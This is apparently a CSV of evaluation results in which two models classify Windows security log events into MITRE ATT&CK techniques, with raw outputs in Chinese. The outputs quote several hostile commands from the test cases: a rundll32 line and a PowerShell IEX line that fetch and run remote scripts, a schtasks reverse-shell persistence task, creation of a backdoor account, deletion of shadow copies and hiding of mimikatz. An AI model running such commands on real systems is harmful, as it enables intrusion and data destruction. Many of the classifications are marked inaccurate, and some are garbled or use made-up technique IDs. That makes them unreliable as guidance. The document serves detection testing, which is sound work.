Model,Test_ID,Is_Valid_JSON,Is_Accurate,Latency_Seconds,Raw_Output
gemma4:e4b,Test_11_Scheduled_Task_Persistence,False,False,136.26,"```json {   ""Malicious_Detection"": true,   ""MITRE_ATTACK_TAGS"": [     {       ""TTP_ID"": ""T1053.12"",       ""Technique_Name"": ""Scheduled Task/Job"",       ""Explanation"": ""攻擊者利用系統內建的排程任務功能（schtasks.exe）來建立一個持久化的惡意任務。這是一種典型的建立持久性（Persistence）的行為，目的是確保惡意程式（reverse_shell.exe）在系統啟動時自動執行，即使系統被重啟或登出，惡意行為仍能持續運行。""     },     {       ""TTP_ID"": ""T1547.001"",       ""Technique_Name"": ""Registry Run Keys / Startup Folder"",       ""Explanation"": ""雖然直接使用了排程任務，但其目的與利用啟動鍵或啟動資料夾達成持久化的原理一致，都是確保惡意程式在系統啟動時自動執行。""     }   ],   ""Explanation"": ""該命令使用 'schtasks /create' 建立了一個名為 'WindowsUpdate' 的排程任務。該任務的關鍵惡意特徵包括：1. **惡意載荷 (Payload)**：指定執行路徑為 'C:\Temp\reverse_shell.exe'，這是一個典型的後門或反向Shell程式。2. **持久化機制 (Persistence)**：使用 '/sc onstart' 設定觸發條件為系統啟動時執行。3. **權限提升 (Privilege Escalation)**：使用 '/ru SYSTEM' 確保該任務以最高權限（SYSTEM）執行，極大地增加了攻擊的成功率和危害性。總體而言，這是一個典型的利用合法工具（Living off the Land）來建立持久性後門的惡意行為。"" } ```"
gemma4:e4b,Test_12_Create_Backdoor_Account,False,False,93.45,"```json {   ""Malicious"": true,   ""MITRE_ATTACK_TAG"": ""T1136"",   ""Explanation"": ""該日誌顯示攻擊者利用系統內建的合法工具 (net.exe) 來執行帳戶創建操作。具體命令 'net user sysadmin_bck P@ssw0rd123! /add /Y' 旨在新增一個名為 'sysadmin_bck' 的使用者帳號。在沒有業務需求或事先授權的情況下，由管理員權限帳號執行新增使用者帳號的操作，極具惡意特徵。這通常是攻擊者在入侵後，為了建立持久性存取點 (Persistence) 或後門帳號 (Backdoor Account)，以確保即使原始憑證被更換，他們仍能維持對系統的控制權。這屬於典型的『利用合法工具進行惡意行為』（Living off the Land）的行為模式。"" } ```"
gemma4:e4b,Test_13_Delete_Shadow_Copies,False,False,110.98,"```json {   ""Malicious_Feature_Detected"": true,   ""MITRE_ATTACK_TTP_ID"": ""T1562"",   ""Explanation"": ""該命令使用 vssadmin.exe 工具執行 'delete shadows /all'，目的是刪除系統所有的 Volume Shadow Copies (VSS)。VSS 提供了系統的快照和恢復點，是進行事後取證（Forensics）和系統恢復的關鍵證據。攻擊者執行此操作屬於典型的『防禦規避』（Defense Evasion）或『影響』（Impact）階段的行為，目的是清除系統的恢復能力和證據鏈，以阻礙安全人員的調查或阻止系統的修復。雖然 vssadmin.exe 本身是合法工具，但其在這種高權限下執行清除所有快照的行為，具有高度的惡意攻擊特徵。"" } ```"
gemma4:e4b,Test_14_System_Info_Discovery,False,False,99.26,"```json {   ""Malicious_Assessment"": ""Suspicious (Suspicious)"",   ""MITRE_ATT&CK_Tags"": [     {       ""TTP_ID"": ""T1082"",       ""Tactic"": ""Discovery"",       ""Technique"": ""System Information Discovery"",       ""Explanation"": ""該行為使用了系統內建的合法工具 (systeminfo.exe) 來收集系統的詳細資訊（如作業系統版本、修補程式、硬體配置等），並將其輸出導向檔案。雖然 systeminfo 本身是系統管理工具，但在攻擊鏈中，這屬於典型的『偵察 (Reconnaissance)』行為，攻擊者常利用此類 LOLBins (Living off the Land Binaries) 來了解目標環境，為後續的攻擊步驟做準備。因此，雖然工具本身是良性的，但其行為模式高度符合惡意偵察的特徵。""     }   ] } ```"
gemma4:e4b,Test_15_Masquerading_svchost,False,False,120.11,"```json {   ""Malicious_Status"": ""高度可疑 (Highly Suspicious)"",   ""MITRE_ATT&CK_TTPs"": [     {       ""TTP_ID"": ""T1036.Masquerading"",       ""Explanation"": ""攻擊者常利用系統核心程序（如svchost.exe）的名稱來偽裝惡意程式，以規避安全工具的檢測。將系統級的執行檔放置在使用者下載目錄（Downloads）是極不正常的行為，強烈暗示該檔案為惡意程式或載入器。""     },     {       ""TTP_ID"": ""T1547.Boot or Logon Autostart Execution"",       ""Explanation"": ""雖然日誌本身未顯示持久化機制，但若此惡意程式成功執行，其目的通常是建立持久性，使其在系統啟動或登入時自動運行。""     }   ],   ""Explanation"": ""該日誌最主要的惡意特徵在於檔案路徑。'svchost.exe' 是 Windows 系統的合法核心程序，但它絕不應該出現在使用者目錄下的 'Downloads' 資料夾中。攻擊者經常使用這種 '偽裝' (Masquerading) 的手法，將惡意程式命名為系統合法檔案的名稱，並將其放置在非標準系統路徑，目的是混淆分析師和安全工具。因此，應將此事件視為惡意活動的極高風險警報。"" } ```"
gemma4:e4b,Test_16_Whoami_Discovery,False,False,87.46,"```json {   ""Malicious_Feature_Detected"": true,   ""MITRE_ATT&CK_TTP_ID"": ""T1082"",   ""Tactic"": ""Discovery"",   ""Explanation"": ""該命令（whoami /all）本身是Windows系統內建的合法工具，用於查詢當前用戶和系統的詳細資訊。然而，在安全分析的背景下，執行此類命令（特別是詳細的系統資訊查詢）是典型的『偵察』（Reconnaissance）行為。攻擊者會利用此命令來繪製目標環境的權限結構、用戶群組和系統配置，以規劃後續的橫向移動或權限提升。因此，雖然命令本身無毒，但其行為模式高度符合攻擊者進行環境偵察的特徵。"" } ```"
gemma4:e4b,Test_17_Rundll32_Execution,False,False,159.96,"```json {   ""Malicious_Detection"": true,   ""MITRE_ATTACK_TAGS"": [     {       ""TTP_ID"": ""T1299"",       ""Name"": ""Command and Scripting Interpreter"",       ""Explanation"": ""攻擊者利用系統內建的腳本語言（如JavaScript）和命令列工具來執行惡意代碼，這是典型的腳本執行行為。""     },     {       ""TTP_ID"": ""T1059.16"",       ""Name"": ""Command-Line Language"",       ""Explanation"": ""攻擊者濫用合法的系統二進位檔（rundll32.exe）來執行非預期的腳本或功能，屬於『利用合法工具進行惡意行為』（Living off the Land, LOLBin）的典型範例。""     },     {       ""TTP_ID"": ""T1190"",       ""Name"": ""Exploit Public-Facing Application"",       ""Explanation"": ""雖然本例未明確指出利用公開應用程式的漏洞，但透過執行外部網址（http://badsite.com/payload.sct）的腳本，其本質是嘗試利用外部資源來執行惡意程式碼，屬於利用漏洞或外部資源的行為。""     }   ],   ""Explanation"": ""該日誌顯示的命令列參數極具惡意特徵。攻擊者濫用了系統工具 `rundll32.exe`，並透過注入的 JavaScript 代碼（`javascript:\""\\..\\mshtml,RunHTMLApplication ...`）來執行惡意邏輯。核心的惡意行為是嘗試透過 `GetObject(\""script:http://badsite.com/payload.sct\"")` 從一個可疑的外部網域（badsite.com）下載並執行一個腳本載荷（payload.sct）。這屬於典型的『利用合法工具執行外部惡意腳本』的攻擊鏈，應被視為高風險的惡意活動。"" } ```"
gemma4:e4b,Test_18_Network_Config_Discovery,False,False,99.98,"```json {   ""Malicious_Assessment"": ""Suspicious (Reconnaissance)"",   ""MITRE_ATTACK_TAGS"": [     ""T1082""   ],   ""Explanation"": ""該行為本身使用系統原生工具（ipconfig.exe）執行標準的網路診斷指令，因此不具備明確的惡意性。然而，攻擊者經常利用此類系統工具（稱為 Living off the Land Binaries, LOLBins）來進行資訊收集（Reconnaissance），以繪製目標的網路拓撲、IP範圍或系統配置。因此，雖然指令本身是良性的，但其目的和行為模式高度符合攻擊者在『偵察 (Discovery)』階段收集內部網路資訊的行為，應視為可疑行為並進行監控。"" } ```"
gemma4:e4b,Test_19_Hide_File_Attrib,False,False,113.63,"```json {   ""Malicious_Indicator"": true,   ""MITRE_ATT&CK_TTP_ID"": ""T1027"",   ""MITRE_ATT&CK_TTP_Name"": ""Obfuscated Files or Information"",   ""Explanation"": ""該日誌顯示攻擊者使用系統原生工具 'attrib.exe' 來修改一個名為 'mimikatz.exe' 的檔案屬性。Mimikatz 是一個極為知名的、用於從記憶體中竊取憑證（如密碼和雜湊值）的惡意工具。攻擊者將其放置在 'C:\\Users\\Public\\'，並使用 '+h' (Hidden) 和 '+s' (System) 屬性來隱藏該惡意載荷。這種行為屬於典型的防禦規避（Defense Evasion）行為，目的是讓惡意檔案在系統瀏覽或基礎安全掃描時難以被發現，為後續的憑證竊取攻擊做準備。"" } ```"
gemma4:e4b,Test_20_WMIC_Process_Call,False,False,134.12,"```json {   ""Malicious"": true,   ""MITRE_ATTACK_TAGS"": [     ""T1059.001"",     ""T1133"",     ""T1047""   ],   ""Explanation"": ""該日誌顯示了典型的惡意攻擊鏈，屬於「利用合法工具執行惡意程式碼」（Living off the Land, LotL）。\n\n1. **工具濫用 (WMIC)**: 攻擊者使用 `wmic` (Windows Management Instrumentation Command-line) 這個系統工具來間接執行後續的惡意指令，這是一種常見的混淆和規避偵測的行為。\n2. **執行 PowerShell**: 攻擊者透過 `wmic` 啟動了 `powershell.exe`。\n3. **下載並執行 (Download and Execute)**: 核心惡意行為是 `IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/rev.ps1')`。\n    *   `New-Object Net.WebClient).DownloadString(...)`：這段程式碼指示系統從外部網路地址 `http://10.10.10.10/rev.ps1` 下載一個惡意 PowerShell 腳本。\n    *   `IEX` (Invoke-Expression)：這是一個極度可疑的參數，它會將下載的字串內容當作程式碼執行，繞過了許多傳統的檔案系統檢查。\n\n**結論**: 該日誌明確展示了攻擊者利用系統工具（WMIC, PowerShell）從外部下載並執行未經授權的惡意腳本，屬於高風險的惡意活動。"" } ```"
my-soc-agent,Test_01_Benign_Browser,True,True,11.08,"{""TTP_ID"": ""None (Benign)"", ""Explanation"": ""該行程被判定為正常系統管理行為，因為它是 Chrome 檔案的正常執行指令。""}"
my-soc-agent,Test_02_Benign_SystemLogon,True,True,8.11,"{""TTP_ID"": ""None (Benign)"", ""Explanation"": ""該事件為一般的系統管理行為，無任何惡意活動。""}"
my-soc-agent,Test_03_Benign_NetworkDNS,True,False,11.67,"{""TTP_ID"": ""T1046.002"", ""Explanation"": ""攻擊者利用 DNS 服務繞過 Firewall 進行 DNS 暴力攻擊，目的是破解系統或專業資料庫""}"
my-soc-agent,Test_04_Benign_AdminPing,True,True,10.64,"{""TTP_ID"": ""None (Benign)"", ""Explanation"": ""該行程是一般的PING命令，用於透過傾向機器學習判斷是否具備惡意行為。""}"
my-soc-agent,Test_05_Benign_Taskmgr,True,True,8.86,"{""TTP_ID"": ""None (Benign)"", ""Explanation"": ""該事件為一般的任務管理行為，無關於任何惡意行為。""}"
my-soc-agent,Test_06_PowerShell_Obfuscation,True,False,14.63,"{""TTP_ID"": ""MUSCIMAL-BINDING-PROTEINS-ACTIVATION"",""Explanation"":""攻擊者使用 PowerShell 進行混淆行為，將 MUSC1 與 MUSC2 這兩個症例相連結，企圖幫助病理學家判決。""}"
my-soc-agent,Test_07_LSASS_MemoryDump,True,False,12.49,"{""TTP_ID"": ""T1053.002"", ""Explanation"": ""攻擊者使用 procdump 工具傾印 lsass.exe 進行資料夾下載，企圖盜取系統內部容器的內容。""}"
my-soc-agent,Test_08_RDP_BruteForce,True,False,10.58,"{""TTP_ID"": ""T1023.001"", ""Explanation"": ""攻擊者嘗試使用密碼错误或無效的登入帳號，但系統已逮捕。""}"
my-soc-agent,Test_09_Disable_Defender,True,False,12.27,"{""TTP_ID"": ""None (Benign)"", ""Explanation"": ""該行程是一個正常的系統管理行為，因為它仅限制了渴望監控系統的防毒軟體進行即時监控。""}"
my-soc-agent,Test_10_Ingress_Tool_Transfer,True,False,10.03,"{""TTP_ID"": ""T1053.002"", ""Explanation"": ""該事件為一種惡意行為，因為將攻擊者的系統進行下載。""}"
my-soc-agent,Test_11_Scheduled_Task_Persistence,True,False,12.77,"{""TTP_ID"": ""T1053.002"", ""Explanation"": ""攻擊者利用 T1053 指令行指令(schtasks)來執行 T1053.002 的反向shell命令，為目標系統服務人員對應""}"
my-soc-agent,Test_12_Create_Backdoor_Account,True,False,12.91,"{""TTP_ID"": ""T1053.001"", ""Explanation"": ""攻擊者嘗試使用 'net user' 命令來添加一名新的管理員，這是一種對抗防毒檢查系統的行為。""}"
my-soc-agent,Test_13_Delete_Shadow_Copies,True,False,12.09,"{""TTP_ID"": ""T1053.002"", ""Explanation"": ""攻擊者使用 vssadmin 命令從事業務日誌中删除所有圖片，為目的逸出系統行政人員或進行惡意行為。""}"
my-soc-agent,Test_14_System_Info_Discovery,True,False,9.99,"{""TTP_ID"": ""None (Benign)"", ""Explanation"": ""該行程是一般的系統管理行為，務必檢查是否有任何內部防範或惡意活動。""}"
my-soc-agent,Test_15_Masquerading_svchost,True,False,13.3,"{""TTP_ID"": ""T1053.002"", ""Explanation"": ""該事件為一個惡意程式執行的 T1053 指令，但因為 CommandLine 中無任何 MITRE ATT&CK 相關指令，判定為正常系統管理行為。""}"
my-soc-agent,Test_16_Whoami_Discovery,True,False,9.5,"{""TTP_ID"": ""None (Benign)"", ""Explanation"": ""該事件為一般的系統管理行為，務必檢查是否有任何其他異常性指標。""}"
my-soc-agent,Test_17_Rundll32_Execution,True,False,12.12,"{""TTP_ID"": ""T1053.001"", ""Explanation"": ""攻擊者利用 RDSS 傾印畫面，企圖使用 MITM 攻擊目的地的資源服務器進行混淆。""}"
my-soc-agent,Test_18_Network_Config_Discovery,False,False,3.11,{
my-soc-agent,Test_19_Hide_File_Attrib,True,False,10.01,"{""TTP_ID"": ""T1053.002"", ""Explanation"": ""攻擊者使用 Mimikatz 從目前的位置下載系統密碼，並進行惡意行為。""}"
my-soc-agent,Test_20_WMIC_Process_Call,True,False,11.31,"{""TTP_ID"": ""T1053.002"", ""Explanation"": ""攻擊者利用 PowerShell 進行混淆性的傾印，企圖繞逸脱系統管理人員。""}"
